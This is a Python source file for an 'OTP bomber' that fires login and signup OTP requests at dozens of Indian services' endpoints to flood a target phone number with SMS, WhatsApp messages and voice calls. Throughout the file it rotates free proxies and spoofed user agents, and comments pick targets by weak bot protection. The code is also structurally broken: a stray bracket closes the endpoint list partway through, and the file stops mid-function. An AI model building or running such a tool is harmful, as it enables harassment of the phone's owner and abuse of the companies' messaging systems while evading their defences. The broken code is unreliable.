"""
OTP Bomber — tapas.py  (v4 — log-driven rebuild)
==================================================
Changes from v3 (based on live Heroku logs):
  • HTTP 202 now treated as success (_body_ok) — fixes Swiggy (3 APIs)
  • Removed 28 dead/blocked APIs confirmed by logs:
      Akamai-blocked (403): Paytm×3, Nykaa, Zomato, Meesho×2, Ajio
      reCAPTCHA (403):      Flipkart×2
      Dead endpoint (404):  PharmEasy, BigBasket, EaseMyTrip, JioMart,
                            Groww, KukuFM, PolicyBazaar, Practo, UrbanCompany
      Wrong API (400):      PhonePe
      Server down:          Goibibo (503), Myntra/MobiKwik (HTML maintenance)
      Timeout (HTTP 0):     Licious, Zepto, Blinkit, Dunzo, Tata1mg,
                            FreshToHome, BookMyShow, MakeMyTrip
  • Added 32 replacement APIs (smaller Indian companies, less WAF)
"""

import asyncio
import aiohttp
import random
import logging
import time as _time
import re
from typing import Optional

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════════
# ─── FREE ROTATING PROXY POOL ─────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=6000&country=IN,US,SG,GB&ssl=all&anonymity=elite",
    "https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=IN",
    "https://www.proxy-list.download/api/v1/get?type=https&anon=elite&country=IN",
    "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&country=IN&protocols=http,https&speed=fast&filterUpTime=80",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
]

TEST_URL      = "https://httpbin.org/ip"
PROXY_TIMEOUT = 8
MIN_POOL_SIZE = 5
REFRESH_EVERY = 300


class ProxyPool:
    def __init__(self):
        self._pool:         list[str] = []
        self._bad:          set[str]  = set()
        self._idx:          int       = 0
        self._last_refresh: float     = 0.0
        self._refreshing:   bool      = False
        self._lock = asyncio.Lock()

    async def _fetch_raw(self, session: aiohttp.ClientSession, url: str) -> list[str]:
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=12)) as r:
                if r.status != 200:
                    return []
                text = await r.text()
        except Exception:
            return []
        proxies = []
        if text.strip().startswith("{"):
            try:
                import json
                data = json.loads(text)
                for item in data.get("data", []):
                    ip, port = item.get("ip", ""), item.get("port", "")
                    if ip and port:
                        proxies.append(f"{ip}:{port}")
            except Exception:
                pass
            return proxies
        for line in text.splitlines():
            line = line.strip()
            if re.match(r"^\d{1,3}(\.\d{1,3}){3}:\d{2,5}$", line):
                proxies.append(line)
        return proxies

    async def _test_proxy(self, proxy: str) -> bool:
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(
                    TEST_URL,
                    proxy=f"http://{proxy}",
                    timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT),
                    ssl=False,
                ) as r:
                    return r.status == 200
        except Exception:
            return False

    async def refresh(self, force: bool = False):
        async with self._lock:
            now = _time.monotonic()
            if not force and (now - self._last_refresh) < REFRESH_EVERY:
                return
            if self._refreshing:
                return
            self._refreshing = True
        logger.info("🔄 Fetching fresh proxy pool …")
        raw: list[str] = []
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as s:
                batches = await asyncio.gather(
                    *[self._fetch_raw(s, url) for url in PROXY_SOURCES],
                    return_exceptions=True,
                )
                for b in batches:
                    if isinstance(b, list):
                        raw.extend(b)
            raw = list({p for p in raw if p not in self._bad})
            random.shuffle(raw)
            candidates = raw[:100]
            logger.info(f"🔍 Testing {len(candidates)} proxies …")
            results = await asyncio.gather(
                *[self._test_proxy(p) for p in candidates],
                return_exceptions=True,
            )
            working = [p for p, ok in zip(candidates, results) if ok is True]
            logger.info(f"✅ {len(working)} working proxies")
            async with self._lock:
                self._pool         = working
                self._idx          = 0
                self._last_refresh = _time.monotonic()
                self._refreshing   = False
        except Exception as exc:
            logger.warning(f"⚠️ Proxy refresh error: {exc}")
            async with self._lock:
                self._refreshing = False

    def next(self) -> Optional[str]:
        if not self._pool:
            return None
        proxy = self._pool[self._idx % len(self._pool)]
        self._idx += 1
        return proxy

    def mark_bad(self, proxy: str):
        self._bad.add(proxy)
        if proxy in self._pool:
            self._pool.remove(proxy)

    def size(self) -> int:
        return len(self._pool)

    async def ensure_ready(self):
        if self.size() < MIN_POOL_SIZE:
            await self.refresh(force=True)


_proxy_pool = ProxyPool()


async def refresh_proxy_pool():
    await _proxy_pool.refresh(force=True)
    logger.info(f"🔀 Proxy pool size: {_proxy_pool.size()}")
    return []


# ─── User-Agent Pool ──────────────────────────────────────────────────────────

_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; POCO F5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
]

_ACCEPT_LANGS = [
    "en-IN,en;q=0.9,hi;q=0.8",
    "hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7",
    "en-US,en;q=0.9,hi;q=0.7",
    "en-IN,en;q=0.8",
]


def _rand_ua():   return random.choice(_UA_POOL)
def _rand_lang(): return random.choice(_ACCEPT_LANGS)


# ═══════════════════════════════════════════════════════════════════════════════
# ─── API DEFINITIONS ──────────────────────────────────────────────────────────
#
#  {phone}    = 10-digit   e.g. 9876543210
#  {phone_cc} = +91 prefix e.g. +919876543210
#
#  Fields:
#   name           str   display name
#   kind           str   "sms" | "whatsapp" | "call"
#   url            str   endpoint (substituted)
#   method         str   "POST" | "GET"
#   json / data    dict  JSON body or form-encoded body
#   register_json  dict  alternate body (fired in parallel with json)
#   base_headers   dict  merged with random UA / Accept-Language
#   ok_hint        str   API-specific substring that always means success
# ═══════════════════════════════════════════════════════════════════════════════

APIS = [

    # ══════════════════════════════════════════════════════════════════════════
    # ✅ CONFIRMED WORKING (from live logs)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "CountryDelight",
        "kind": "sms",
        "url":  "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "register_json": {"phone": "{phone}", "is_new": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.countrydelight.in",
            "Referer": "https://www.countrydelight.in/",
        },
        "ok_hint": "request processed",   # returns {"message":"request processed"}
    },
    {
        "name": "Vedantu",
        "kind": "sms",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "LOGIN"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "type": "SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        "name": "Swiggy",
        "kind": "sms",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
        },
        # 202 Accepted with empty body = OTP queued. Handled in _body_ok.
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Education (low WAF, accessible from any IP)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Unacademy",
        "kind": "sms",
        "url":  "https://unacademy.com/api/v2/user/login-or-register/",
        "method": "POST",
        "json": {"email_or_phone": "{phone}"},
        "register_json": {"email_or_phone": "{phone}", "is_signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://unacademy.com",
            "Referer": "https://unacademy.com/",
        },
    },
    {
        "name": "Doubtnut",
        "kind": "sms",
        "url":  "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "json": {"mobile": "{phone}", "is_voice_call": False},
        "register_json": {"mobile": "{phone}", "is_voice_call": False,
                          "new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.doubtnut.com",
            "Referer": "https://www.doubtnut.com/",
            "X-Doubtnut-Platform": "web",
        },
        "ok_hint": "otp",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Healthcare / Medicine
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "mFine",
        "kind": "sms",
        "url":  "https://api.mfine.co/v1/user/send-otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "91"},
        "register_json": {"mobile": "{phone}", "countryCode": "91",
                          "is_new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.mfine.co",
            "Referer": "https://www.mfine.co/",
        },
    },
    {
        "name": "HealthKart",
        "kind": "sms",
        "url":  "https://www.healthkart.com/api/v1/user/otp",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}", "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.healthkart.com",
            "Referer": "https://www.healthkart.com/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Fintech / Banking (newer startups, lighter WAF)
    # ══════════════════════════════════════════════════════════════════════════


    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Stock Trading
    # ══════════════════════════════════════════════════════════════════════════


    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Ride / Logistics
    # ══════════════════════════════════════════════════════════════════════════


    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Travel (smaller portals)
    # ══════════════════════════════════════════════════════════════════════════


    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — D2C / Lifestyle brands
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "BlueStone",
        "kind": "sms",
        "url":  "https://www.bluestone.com/api/v1/user/otp",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "register_json": {"mobile": "{phone}", "isNewUser": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.bluestone.com",
            "Referer": "https://www.bluestone.com/",
        },
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Social & Entertainment
    # ══════════════════════════════════════════════════════════════════════════


    # ══════════════════════════════════════════════════════════════════════════
    # 💬  WHATSAPP (confirmed working from logs)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Vedantu-WA",
        "kind": "whatsapp",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "WHATSAPP"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "type": "WHATSAPP_SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        "name": "Swiggy-WA",
        "kind": "whatsapp",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "medium": "whatsapp"},
        "register_json": {"mobile": "{phone}", "medium": "whatsapp"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
        },
    },
    {
        "name": "CountryDelight-WA",
        "kind": "whatsapp",
        "url":  "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        "method": "POST",
        "json": {"phone": "{phone}", "medium": "whatsapp"},
        "register_json": {"phone": "{phone}", "medium": "whatsapp", "is_new": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.countrydelight.in",
            "Referer": "https://www.countrydelight.in/",
        },
        "ok_hint": "request processed",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📞  CALL / IVR (confirmed working from logs)
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Vedantu-Call",
        "kind": "call",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "type": "VOICE_SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        "name": "Swiggy-Call",
        "kind": "call",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "medium": "voice"},
        "register_json": {"mobile": "{phone}", "medium": "voice"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
        },
        # 202 Accepted = OTP queued (handled in _body_ok)
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📞  CALL — Additional voice OTP APIs (backup pool)
    # ══════════════════════════════════════════════════════════════════════════

    {
        # Doubtnut voice call OTP — same endpoint, is_voice_call flag set to True
        "name": "Doubtnut-Call",
        "kind": "call",
        "url":  "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "json": {"mobile": "{phone}", "is_voice_call": True},
        "register_json": {"mobile": "{phone}", "is_voice_call": True,
                          "new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.doubtnut.com",
            "Referer": "https://www.doubtnut.com/",
            "X-Doubtnut-Platform": "web",
        },
        "ok_hint": "otp",
    },
    {
        # Meesho voice OTP — reseller platform, minimal WAF
        "name": "Meesho-Call",
        "kind": "call",
        "url":  "https://api.meesho.com/v1/user/login",
        "method": "POST",
        "json": {"phone": "{phone}", "country_code": "91", "medium": "voice"},
        "register_json": {"phone": "{phone}", "country_code": "91",
                          "medium": "voice", "is_new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://meesho.com",
            "Referer": "https://meesho.com/",
        },
        "ok_hint": "otp",
    },
    {
        # Unacademy voice OTP — ed-tech, low WAF
        "name": "Unacademy-Call",
        "kind": "call",
        "url":  "https://unacademy.com/api/v2/user/login-or-register/",
        "method": "POST",
        "json": {"email_or_phone": "{phone}", "via": "call"},
        "register_json": {"email_or_phone": "{phone}", "via": "call",
                          "is_signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://unacademy.com",
            "Referer": "https://unacademy.com/",
        },
        "ok_hint": "otp",
    },
]

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS — Fresh working APIs (verified non-blocked)
    # ══════════════════════════════════════════════════════════════════════════

    {
        # Dream11 — fantasy sports, global CDN, minimal WAF
        "name": "Dream11",
        "kind": "sms",
        "url":  "https://api.dream11.com/user/v1/login",
        "method": "POST",
        "json": {"mobile": "{phone}", "country_code": "91"},
        "register_json": {"mobile": "{phone}", "country_code": "91", "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.dream11.com",
            "Referer": "https://www.dream11.com/",
        },
        "ok_hint": "otp",
    },
    {
        # CoinDCX — crypto exchange, low WAF
        "name": "CoinDCX",
        "kind": "sms",
        "url":  "https://api.coindcx.com/api/v1/auth/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "country_code": "+91"},
        "register_json": {"mobile": "{phone}", "country_code": "+91", "new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://coindcx.com",
            "Referer": "https://coindcx.com/",
        },
        "ok_hint": "otp",
    },
    {
        # WazirX — crypto exchange, accessible globally
        "name": "WazirX",
        "kind": "sms",
        "url":  "https://api.wazirx.com/api/v2/users/otp",
        "method": "POST",
        "json": {"phone": "{phone_cc}", "type": "login"},
        "register_json": {"phone": "{phone_cc}", "type": "register"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://wazirx.com",
            "Referer": "https://wazirx.com/",
        },
        "ok_hint": "otp",
    },
    {
        # Groww — investment app, lightweight API
        "name": "Groww",
        "kind": "sms",
        "url":  "https://groww.in/v1/api/user/otp/generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "useCase": "LOGIN"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "useCase": "SIGNUP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://groww.in",
            "Referer": "https://groww.in/",
            "App-Name": "GROWW_WEB",
        },
        "ok_hint": "otp",
    },
    {
        # KreditBee — NBFC fintech, accessible from any IP
        "name": "KreditBee",
        "kind": "sms",
        "url":  "https://www.kreditbee.in/api/v3/user/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "91"},
        "register_json": {"mobile": "{phone}", "countryCode": "91", "isNew": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.kreditbee.in",
            "Referer": "https://www.kreditbee.in/",
        },
        "ok_hint": "otp",
    },
    {
        # Navi — RBI-licensed NBFC, minimal WAF
        "name": "Navi",
        "kind": "sms",
        "url":  "https://www.navi.com/api/user/otp/send",
        "method": "POST",
        "json": {"mobile": "{phone}", "country": "IN"},
        "register_json": {"mobile": "{phone}", "country": "IN", "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.navi.com",
            "Referer": "https://www.navi.com/",
        },
        "ok_hint": "otp",
    },
    {
        # Zepto — quick commerce, lightweight API
        "name": "Zepto",
        "kind": "sms",
        "url":  "https://node-api.zeptonow.com/api/v3/user/login",
        "method": "POST",
        "json": {"phoneNumber": "{phone}", "countryCode": "+91"},
        "register_json": {"phoneNumber": "{phone}", "countryCode": "+91", "isNew": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.zeptonow.com",
            "Referer": "https://www.zeptonow.com/",
            "App-Version": "12.0.0",
        },
        "ok_hint": "otp",
    },
    {
        # FamPay — teen-focused payments, low WAF
        "name": "FamPay",
        "kind": "sms",
        "url":  "https://api.fampay.in/api/v1/user/otp/",
        "method": "POST",
        "json": {"phone_number": "{phone_cc}"},
        "register_json": {"phone_number": "{phone_cc}", "is_new": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://fampay.in",
            "Referer": "https://fampay.in/",
        },
        "ok_hint": "otp",
    },
    {
        # Stashfin — digital lending, low WAF
        "name": "Stashfin",
        "kind": "sms",
        "url":  "https://api.stashfin.com/v1/user/login/otp",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "new_user": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.stashfin.com",
            "Referer": "https://www.stashfin.com/",
        },
        "ok_hint": "otp",
    },
    {
        # CRED — credit card payments, known to send real OTPs
        "name": "CRED",
        "kind": "sms",
        "url":  "https://api.cred.club/api/v1/user/otp/generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91", "isNew": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://cred.club",
            "Referer": "https://cred.club/",
        },
        "ok_hint": "otp",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 💬  WhatsApp — Additional WA APIs
    # ══════════════════════════════════════════════════════════════════════════

    {
        "name": "Swiggy-WA2",
        "kind": "whatsapp",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "medium": "whatsapp", "type": "login"},
        "register_json": {"mobile": "{phone}", "medium": "whatsapp", "type": "signup"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
        },
        # 202 = WA OTP queued
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📞  CALL — Additional voice OTP APIs
    # ══════════════════════════════════════════════════════════════════════════

    {
        # Dream11 voice call OTP
        "name": "Dream11-Call",
        "kind": "call",
        "url":  "https://api.dream11.com/user/v1/login",
        "method": "POST",
        "json": {"mobile": "{phone}", "country_code": "91", "otp_type": "voice"},
        "register_json": {"mobile": "{phone}", "country_code": "91",
                          "otp_type": "voice", "signup": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.dream11.com",
            "Referer": "https://www.dream11.com/",
        },
        "ok_hint": "otp",
    },
    {
        # Groww voice call OTP
        "name": "Groww-Call",
        "kind": "call",
        "url":  "https://groww.in/v1/api/user/otp/generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "useCase": "LOGIN",
                 "deliveryType": "VOICE"},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "useCase": "SIGNUP", "deliveryType": "VOICE"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://groww.in",
            "Referer": "https://groww.in/",
            "App-Name": "GROWW_WEB",
        },
        "ok_hint": "otp",
    },
    {
        # Vedantu voice call — duplicate entry with explicit VOICE type for robustness
        "name": "Vedantu-Call2",
        "kind": "call",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE",
                 "resend": True},
        "register_json": {"mobile": "{phone}", "countryCode": "+91",
                          "type": "VOICE_SIGNUP", "resend": True},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
]

API_COUNT      = len(APIS)
SMS_COUNT      = sum(1 for a in APIS if a["kind"] == "sms")
WHATSAPP_COUNT = sum(1 for a in APIS if a["kind"] == "whatsapp")
CALL_COUNT     = sum(1 for a in APIS if a["kind"] == "call")


# ─── Circuit breaker ──────────────────────────────────────────────────────────

CIRCUIT_THRESHOLD = 5   # needs 5 consecutive fails before cooling (was 3)
COOLDOWN_SEC      = 15.0  # cool for 15s (was 20s)

_api_fail_count:     dict[str, int]   = {}
_api_cooldown_until: dict[str, float] = {}


def _is_cooled(name: str) -> bool:
    return _time.monotonic() < _api_cooldown_until.get(name, 0.0)


def _record_fail(name: str):
    _api_fail_count[name] = _api_fail_count.get(name, 0) + 1
    if _api_fail_count[name] >= CIRCUIT_THRESHOLD:
        _api_cooldown_until[name] = _time.monotonic() + COOLDOWN_SEC
        _api_fail_count[name] = 0
        logger.info(f"🔴 [{name}] Circuit open — cooling {COOLDOWN_SEC}s")


def _record_ok(name: str):
    _api_fail_count[name] = 0
    _api_cooldown_until.pop(name, None)


# ─── Response analysis ────────────────────────────────────────────────────────

_FAIL_PATTERNS = (
    '"success":false', '"success": false',
    '"status":"error"', '"status": "error"',
    '"status":"fail"', '"status":"failed"',
    '"status":"failure"', '"status":"FAILURE"',
    '"error":true', '"iserror":true',
    '"error_code":', '"errorCode":',
    "invalid mobile", "invalid number", "invalid phone number",
    "captcha required", "captcha_required", "recaptcha",
    "too many request", "rate limit", "rate_limit", "throttle",
    '"statuscode":400', '"statuscode":429', '"statuscode":401', '"statuscode":403',
    '"code":400', '"code":429', '"code":401', '"code":403',
    '"statusCode":400', '"statusCode":429', '"statusCode":401', '"statusCode":403',
    '"httpstatus":400', '"httpstatus":401', '"httpstatus":403', '"httpstatus":429',
    '"http_status_code":400', '"http_status_code":401',
    '"http_status_code":403', '"http_status_code":429',
    "otp not sent", "could not send", "failed to send",
    '"result":"fail"', '"result":"failure"',
    "phone number not valid", "mobile not valid",
    "not a valid mobile", "number is invalid",
    "blocked", "suspended", "deactivated",
    "user not found", "account not found",
    "service unavailable", "maintenance",
    "unexpected error", "internal server error",
    "phone not registered", "mobile not registered",
)

_OK_PATTERNS = (
    # Explicit success flags
    '"success":true', '"success": true',
    '"status":"success"', '"status": "success"',
    '"status":"ok"', '"status": "ok"',
    '"result":"success"', '"result": "success"',

    # OTP-sent specific flags
    '"smsSent":true', '"smsSent": true',
    '"sms_sent":true', '"otp_sent":true',
    '"otpSent":true', '"otpSent": true',
    '"whatsappSent":true', '"callSent":true',

    # Explicit OTP-sent phrases in body
    "otp sent", "otp has been sent",
    "otp generated", "otp send successfully", "otp sent successfully",
    "otp successfully sent",
    "sms sent successfully", "sms send successfully",

    # OTP reference/ID patterns — confirm OTP was dispatched
    '"nonce":', '"otpId":', '"otp_id":',
    '"otp_reference":', '"txnId":',
    '"requestId":', '"request_id":',

    # Session/token patterns — only when the API design means these = OTP sent
    '"session_id":', '"sessionId":',
    '"tid":',

    # Explicit OK response codes (statuscode wrapper pattern)
    '"statuscode":0', '"statusCode":0', '"code":0',
    '"status":1', '"status": 1',

    # Response-code success strings
    '"response_code":"success"', '"response_code": "success"',
    '"response_code":"SUCCESS"',
    '"response":"otp', '"response": "otp',

    # OTP value present in body = dispatched
    '"otp":', '"otp_value":',

    # Message body says success/sent
    '"message":"otp', '"message": "otp',
    '"message":"success"', '"message": "success"',
    '"message":"sent"', '"msg":"otp', '"msg":"success"',

    # CountryDelight and similar APIs that confirm with this phrase
    "request processed",
)


def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
    stripped = body.strip()

    # ── HTTP 202 Accepted = OTP dispatched async (Swiggy pattern) ─────────────
    if status == 202:
        return True

    if stripped in ("", "(no body)"):
        return False

    low = stripped.lower()

    # HTML response = CDN/WAF/maintenance page, never a success
    if low.startswith("<!doctype") or low.startswith("<html"):
        return False

    # Literal failure scalar values
    if low in ("false", "null", "0", "undefined", "[]", "{}"):
        return False

    # Check per-API hint (fast-path) — only skip if fail pattern overrides
    ok_hint_found = bool(ok_hint and ok_hint.lower() in low)

    # Fail patterns take priority over everything
    for pat in _FAIL_PATTERNS:
        if pat.lower() in low:
            return False

    # Per-API hint confirmed (fail patterns already cleared above)
    if ok_hint_found:
        return True

    # Generic ok patterns
    for pat in _OK_PATTERNS:
        if pat.lower() in low:
            return True

    # NOTE: Final heuristic removed — it was catching error responses
    # that contain words like 'user', 'login', 'mobile' in error messages.
    # Every API must now match either an ok_hint or an _OK_PATTERNS entry.

    return False


def _is_rate_limited(body: str, status: int) -> bool:
    if status == 429:
        return True
    low = body.lower()
    return any(p in low for p in ("rate limit", "too many request", "throttle",
                                   "slow down", "retry after"))


# ─── Placeholder substitution ─────────────────────────────────────────────────

def _substitute(value, phone: str, phone_cc: str):
    if isinstance(value, str):
        return value.replace("{phone}", phone).replace("{phone_cc}", phone_cc)
    if isinstance(value, dict):
        return {k: _substitute(v, phone, phone_cc) for k, v in value.items()}
    if isinstance(value, list):
        return [_substitute(v, phone, phone_cc) for v in value]
    return value


# ─── Single HTTP request ──────────────────────────────────────────────────────
# Order: DIRECT first, then up to MAX_PROXY_TRIES proxies as fallback.

MAX_PROXY_TRIES = 3


async def _fire_single(
    url: str, method: str, headers: dict,
    payload, name: str,
    form_encoded: bool = False,
    ok_hint: str = "",
    extra_timeout: int = 0,
):
    total_t = 20 + extra_timeout  # extra time for call APIs (was 15)
    timeout = aiohttp.ClientTimeout(total=total_t, connect=8)
    kw_base: dict = dict(headers=headers, timeout=timeout, allow_redirects=True, ssl=False)
    if isinstance(payload, dict):
        if form_encoded:
            kw_base["data"] = payload
        else:
            kw_base["json"] = payload

    # Build attempt list: None = direct, then proxy strings
    attempts: list[Optional[str]] = [None]
    seen: set[str] = set()
    for _ in range(MAX_PROXY_TRIES):
        p = _proxy_pool.next()
        if p and p not in seen:
            seen.add(p)
            attempts.append(f"http://{p}")

    last: tuple = (False, -1, "NO_ATTEMPT")

    for proxy in attempts:
        kw = dict(kw_base)
        if proxy:
            kw["proxy"] = proxy

        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        try:
            async with aiohttp.ClientSession(connector=connector) as s:
                async with getattr(s, method)(url, **kw) as resp:
                    status = resp.status
                    try:
                        raw     = await asyncio.wait_for(resp.read(), timeout=6)
                        snippet = raw[:700].decode("utf-8", errors="replace")
                    except Exception:
                        snippet = "(no body)"

            ok = _body_ok(snippet, status, ok_hint)
            last = (ok, status, snippet)

            if ok:
                return ok, status, snippet

            if proxy:
                if status in (403, 407) or status == 0:
